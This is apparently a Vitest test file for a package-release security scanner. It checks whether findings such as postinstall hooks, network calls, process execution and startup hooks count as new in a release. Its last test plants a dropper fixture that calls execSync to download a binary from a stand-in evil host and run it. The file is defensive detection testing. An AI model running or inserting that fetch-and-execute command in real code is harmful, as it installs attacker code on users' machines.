import { describe, expect, test } from "vitest";
import {
  annotateFindingsWithDiffStatus,
  computeRisk,
  createPackageDiff,
  deterministicFindings,
  projectReleaseRuleFindings,
} from "../server/lib/review";
import { changedStagedLines } from "../server/lib/review/rules/context";

describe("changed staged line numbers", () => {
  test.each([
    ["same\n", "same\n", []],
    ["first\nsecond\n", "first\nchanged\n", [2]],
    ["first\nremoved\nlast\n", "first\nlast\n", []],
    ["first", "first\nadded", [1, 2]],
  ])("maps staged-side additions and replacements", (previous, staged, expected) => {
    expect([...changedStagedLines(previous, staged)]).toEqual(expected);
  });
});

describe("review diff annotation", () => {
  test("adds best-effort line numbers and diff annotations to findings", () => {
    const before = [
      {
        path: "index.js",
        size: 20,
        sha256: "old",
        flags: [],
        textSample: "export const value = 1;\n",
      },
    ];
    const staged = [
      {
        path: "package.json",
        size: 120,
        sha256: "pkg",
        flags: [],
        textSample: `{
  "name": "pkg",
  "scripts": {
    "postinstall": "node install.js"
  }
}`,
      },
      {
        path: "index.js",
        size: 80,
        sha256: "new",
        flags: [],
        textSample: "export const value = 1;\nfetch('/debug');\n",
      },
    ];
    const diff = createPackageDiff(before, staged);
    const findings = deterministicFindings(staged, diff);

    expect(findings).toContainEqual(
      expect.objectContaining({
        file: "package.json",
        evidence: "postinstall: node install.js",
        line: 4,
      }),
    );
    expect(findings).toContainEqual(
      expect.objectContaining({
        file: "index.js",
        evidence: "new/changed modified file: network-capable code path",
        line: 2,
      }),
    );

    const annotated = annotateFindingsWithDiffStatus(findings, diff);
    expect(annotated.find((finding) => finding.file === "index.js")).toMatchObject({
      diffStatus: "modified",
      releaseDelta: true,
    });
    expect(annotated.find((finding) => finding.file === "package.json")).toMatchObject({
      diffStatus: "added",
      releaseDelta: true,
    });

    // With no downloaded baseline every file reads as added, which would grade
    // the package's whole contents as this release's delta. Report the missing
    // comparison instead.
    const withoutBaseline = annotateFindingsWithDiffStatus(findings, diff, {
      baselineComparisonSkipped: true,
    });
    expect(withoutBaseline.every((finding) => finding.releaseDelta === false)).toBe(true);
    expect(withoutBaseline.every((finding) => finding.diffStatus === "unknown")).toBe(true);
  });

  test("keeps modified-file findings contextual when the finding line did not change", () => {
    const previous = [
      {
        path: "src/server.ts",
        size: 60,
        sha256: "old",
        flags: [],
        textSample: "fetch('/existing-risk');\nexport const value = 1;\n",
      },
    ];
    const staged = [
      {
        path: "src/server.ts",
        size: 60,
        sha256: "new",
        flags: [],
        textSample: "fetch('/existing-risk');\nexport const value = 2;\n",
      },
    ];
    const diff = createPackageDiff(previous, staged);
    const annotated = annotateFindingsWithDiffStatus(
      [
        {
          id: "existing-risk",
          severity: "medium",
          file: "src/server.ts",
          line: 1,
          evidence: "network-capable code path",
          reason: "existing network path",
        },
        {
          id: "changed-line",
          severity: "medium",
          file: "src/server.ts",
          line: 2,
          evidence: "changed value",
          reason: "changed release line",
        },
      ],
      diff,
      { previousFiles: previous, stagedFiles: staged },
    );

    expect(annotated.find((finding) => finding.id === "existing-risk")).toMatchObject({
      diffStatus: "modified",
      releaseDelta: false,
    });
    expect(annotated.find((finding) => finding.id === "changed-line")).toMatchObject({
      diffStatus: "modified",
      releaseDelta: true,
    });
  });

  test("projects only release-scoped findings without persistence annotations", () => {
    const base = {
      severity: "high",
      file: "index.js",
      evidence: "network-capable code path",
      reason: "release code opens a network connection",
      ruleId: "code.network-access",
      ruleVersion: "1.0.0",
    };

    expect(
      projectReleaseRuleFindings([
        { ...base, diffStatus: "added", releaseDelta: true },
        { ...base, file: "existing.js", diffStatus: "unchanged", releaseDelta: false },
      ]),
    ).toEqual([base]);
  });

  test("classifies manifest-diff dependency findings as release delta regardless of line", () => {
    // These rules are derived from the previous-vs-staged manifest diff, so they
    // are release-scoped by construction; they must not fall through to the
    // line-diff heuristic where an unchanged duplicate key would misclassify
    // them as package context.
    const annotated = annotateFindingsWithDiffStatus(
      [
        { id: "added", severity: "medium", file: "package.json", ruleId: "dependency.added" },
        { id: "bump", severity: "low", file: "package.json", ruleId: "dependency.major-bump" },
      ],
      [{ path: "package.json", status: "modified" }],
      {},
    );

    expect(annotated.every((finding) => finding.releaseDelta)).toBe(true);
  });

  test("keeps modified-file findings release scoped when a later matching line changed", () => {
    const previous = [
      {
        path: "src/server.ts",
        size: 60,
        sha256: "old",
        flags: [],
        textSample: "fetch('/existing-risk');\nexport const value = 1;\n",
      },
    ];
    const staged = [
      {
        path: "src/server.ts",
        size: 90,
        sha256: "new",
        flags: [],
        textSample:
          "fetch('/existing-risk');\nexport const value = 1;\nfetch('https://example.invalid/new-risk');\n",
      },
    ];
    const diff = createPackageDiff(previous, staged);
    const findings = deterministicFindings(staged, diff);
    const annotated = annotateFindingsWithDiffStatus(findings, diff, {
      previousFiles: previous,
      stagedFiles: staged,
    });

    expect(annotated.find((finding) => finding.ruleId === "code.network-access")).toMatchObject({
      line: 1,
      diffStatus: "modified",
      releaseDelta: true,
    });
  });

  test("uses Python annotation patterns for extensionless modified files", () => {
    const previous = [
      {
        path: "scripts/post_install",
        size: 100,
        sha256: "old",
        flags: [],
        textSample:
          "import urllib.request\nurllib.request.urlopen('https://example.invalid/existing')\nvalue = 1\n",
      },
    ];
    const staged = [
      {
        path: "scripts/post_install",
        size: 160,
        sha256: "new",
        flags: [],
        textSample:
          "import urllib.request\nurllib.request.urlopen('https://example.invalid/existing')\nvalue = 2\nurllib.request.urlopen('https://example.invalid/new')\n",
      },
    ];
    const diff = createPackageDiff(previous, staged);
    const findings = deterministicFindings(staged, diff, null, { codePatternSet: "python" });
    const annotated = annotateFindingsWithDiffStatus(findings, diff, {
      previousFiles: previous,
      stagedFiles: staged,
      codePatternSet: "python",
    });

    expect(annotated.find((finding) => finding.ruleId === "code.network-access")).toMatchObject({
      file: "scripts/post_install",
      line: 1,
      diffStatus: "modified",
      releaseDelta: true,
    });
  });

  test("keeps PyPI adapter findings release scoped even when paths use artifact namespaces", () => {
    const diff = [
      {
        path: "wheel/py3-none-any/sitecustomize.py",
        status: "added",
        stagedSize: 7,
        stagedSha256: "hook",
        flags: [],
      },
    ];
    const annotated = annotateFindingsWithDiffStatus(
      [
        {
          severity: "high",
          file: "dist/demo_package-1.2.0-py3-none-any.whl/sitecustomize.py",
          evidence: "sitecustomize.py runs automatically on interpreter startup",
          reason: "startup hook",
          ruleId: "pypi.startup-hook",
        },
      ],
      diff,
    );

    expect(annotated[0]).toMatchObject({
      diffStatus: "unknown",
      releaseDelta: true,
    });
  });

  test("keeps VS Code adapter findings release scoped on an unchanged file with a baseline", () => {
    const unchangedFile = {
      path: "out/extension.js",
      size: 40,
      sha256: "same",
      textSample: "exports.activate = () => require('vm').runInThisContext(x);",
      flags: [],
    };
    const diff = [{ path: "out/extension.js", status: "unchanged" }];
    // A VSIX with a marketplace baseline whose flagged file did not change since
    // the last release. The finding is a property of the release, not a line
    // diff, so it must stay release-scoped instead of falling through to a
    // releaseDelta: false diff annotation that understates releaseRisk.
    const annotated = annotateFindingsWithDiffStatus(
      [
        {
          severity: "high",
          file: "out/extension.js",
          line: 1,
          evidence: "activation loads a WebAssembly module on startup",
          reason: "startup wasm loader",
          ruleId: "vscode.startup-wasm-loader",
        },
      ],
      diff,
      {
        codePatternSet: "javascript",
        previousFiles: [unchangedFile],
        stagedFiles: [unchangedFile],
      },
    );

    expect(annotated[0]).toMatchObject({
      diffStatus: "unchanged",
      releaseDelta: true,
    });
  });
});

describe("baseline finding fingerprints", () => {
  test("keeps a line-less modified-file finding contextual when the baseline already fired the same rule", () => {
    const previous = [
      {
        path: "lib/util.js",
        size: 60,
        sha256: "old",
        flags: [],
        textSample: "const { execSync } = require('child_process');\nexecSync('node -v');\n",
      },
    ];
    const staged = [
      {
        path: "lib/util.js",
        size: 70,
        sha256: "new",
        flags: [],
        textSample:
          "const { execSync } = require('child_process');\nexecSync('node -v');\n// touched\n",
      },
    ];
    const diff = createPackageDiff(previous, staged);
    const annotated = annotateFindingsWithDiffStatus(
      [
        {
          severity: "high",
          file: "lib/util.js",
          evidence: "process or shell execution",
          reason: "package may execute arbitrary commands",
          ruleId: "code.process-execution",
        },
      ],
      diff,
      { previousFiles: previous, stagedFiles: staged },
    );
    expect(annotated[0]).toMatchObject({ diffStatus: "modified", releaseDelta: false });
  });

  test("fails open to release delta when the baseline has no matching finding", () => {
    const previous = [
      {
        path: "lib/util.js",
        size: 60,
        sha256: "old",
        flags: [],
        textSample: "export const a = 1;\n",
      },
    ];
    const staged = [
      {
        path: "lib/util.js",
        size: 70,
        sha256: "new",
        flags: [],
        textSample: "export const a = 2;\n",
      },
    ];
    const diff = createPackageDiff(previous, staged);
    const annotated = annotateFindingsWithDiffStatus(
      [
        {
          severity: "high",
          file: "lib/util.js",
          evidence: "process or shell execution",
          reason: "package may execute arbitrary commands",
          ruleId: "code.process-execution",
        },
      ],
      diff,
      { previousFiles: previous, stagedFiles: staged },
    );
    expect(annotated[0]).toMatchObject({ diffStatus: "modified", releaseDelta: true });
  });
});

describe("code.remote-shell release-delta classification", () => {
  const manifest = { name: "p", version: "1.0.1", main: "index.js" };

  test("a decoy shell token in an untouched line does not hide the added dropper", () => {
    // Regression: `patternsForFinding` had no case for `code.remote-shell`, so
    // the rule could only be release-delta when its recorded line happened to
    // be a changed line — and the recorded line is the *first* match in the
    // file. Any pre-existing `curl`/`wget`/`nc` token earlier in the file (a
    // comment, a usage string) pinned it to an unchanged line and dropped the
    // newly added dropper out of `releaseRisk`, which is what the workflow gate
    // reads. The gate then recommended approve.
    const previousFiles = [
      {
        path: "package.json",
        size: 40,
        sha256: "a",
        flags: [],
        textSample: JSON.stringify({ name: "p", version: "1.0.0", main: "index.js" }),
      },
      {
        path: "index.js",
        size: 60,
        sha256: "b",
        flags: [],
        textSample: "// see: curl https://example.invalid/docs\nconst a = 1;\n",
      },
    ];
    const stagedFiles = [
      {
        path: "package.json",
        size: 40,
        sha256: "c",
        flags: [],
        textSample: JSON.stringify(manifest),
      },
      {
        path: "index.js",
        size: 160,
        sha256: "d",
        flags: [],
        textSample:
          "// see: curl https://example.invalid/docs\nconst a = 1;\n" +
          'require("child_process").execSync("wget http://evil.invalid/p -O /tmp/p && /tmp/p");\n',
      },
    ];

    const diff = createPackageDiff(previousFiles, stagedFiles);
    const annotated = annotateFindingsWithDiffStatus(
      deterministicFindings(stagedFiles, diff, manifest),
      diff,
      { previousFiles, stagedFiles },
    );

    const remoteShell = annotated.find((finding) => finding.ruleId === "code.remote-shell");
    expect(remoteShell).toBeDefined();
    // The recorded line is still the decoy on line 1 — that is where the first
    // pattern match is — but the finding is release delta because the rule's
    // patterns also match the added line.
    expect(remoteShell.releaseDelta).toBe(true);
    expect(computeRisk(annotated.filter((finding) => finding.releaseDelta))).toBe("high");
  });
});
